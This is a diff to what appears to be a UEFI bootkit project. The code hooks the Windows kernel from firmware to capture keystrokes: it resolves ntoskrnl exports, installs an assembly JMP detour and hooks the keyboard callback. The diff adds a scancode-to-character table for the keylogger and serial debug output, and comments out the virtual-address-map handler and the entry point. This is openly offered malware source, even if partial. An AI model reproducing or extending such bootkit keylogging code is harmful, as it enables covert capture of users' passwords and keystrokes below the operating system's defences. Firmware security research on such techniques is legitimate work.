@@ -59,6 +59,40 @@ VOID* g_KeyLoggerPtr = NULL;
  * https://learn.microsoft.com/en-us/previous-versions/ff542324(v=vs.85) -> MSDN!!!!!!!
  * 5) Print chars using SerialWrite.
  */
+char kbd_US[128] =
+{
+    0, 27, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\b',
+    '\t',
+    'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',
+    0,
+    'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', 0, '\\',
+    'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 0,
+    '*',
+    0,
+    ' ',
+    0,
+    0, 0, 0, 0, 0, 0, 0, 0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    0,
+    '-',
+    0,
+    0,
+    0,
+    '+',
+    0,
+    0,
+    0,
+    0,
+    0,
+    0, 0, 0,
+    0,
+    0,
+    0,
+};
 
 extern VOID HookEntry(void);
 extern VOID MyKeyboardCallbackHook1(void);
@@ -160,10 +194,15 @@ VOID DumpBytesInline(VOID* Address, UINTN Count) {
 VOID* EFIAPI FindNtosExportByName(VOID *kernelBase , CHAR8* exportName)
 {
     SerialWrite("hello from FindNtosExportByName \n");
+    SerialWrite("kernelBase = ");
+    SerialWriteHex((UINT64)kernelBase);
+    SerialWrite("exportName = ");
+    SerialWrite(exportName);
     EFI_IMAGE_DOS_HEADER* DosHeaders = (EFI_IMAGE_DOS_HEADER*)kernelBase;
     EFI_IMAGE_NT_HEADERS64* NtHeaders = (EFI_IMAGE_NT_HEADERS64*)((UINT8*)kernelBase + DosHeaders->e_lfanew);
     UINT32 exportDirRva = NtHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
     if (exportDirRva == 0) {
+            SerialWrite("here \n");
         return NULL;
     }
     EFI_IMAGE_EXPORT_DIRECTORY* ExportDirReal = (EFI_IMAGE_EXPORT_DIRECTORY*)(exportDirRva + (UINT8*)kernelBase);
@@ -485,7 +524,7 @@ EFI_STATUS InstallPureAsmHook(VOID* TargetFunction)
     SerialWrite("Hook installed successfully with JMP r10\n");
     return EFI_SUCCESS;
 }
-
+/**
 VOID EFIAPI NotifySetVirtualAddressMap(EFI_EVENT Event, VOID* Context)
 {
     SerialWrite("winloadVA: ");
@@ -609,3 +648,4 @@ EFI_STATUS EFIAPI HookEntryPoint(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE 
 
     return EFI_SUCCESS;
 }
+*/
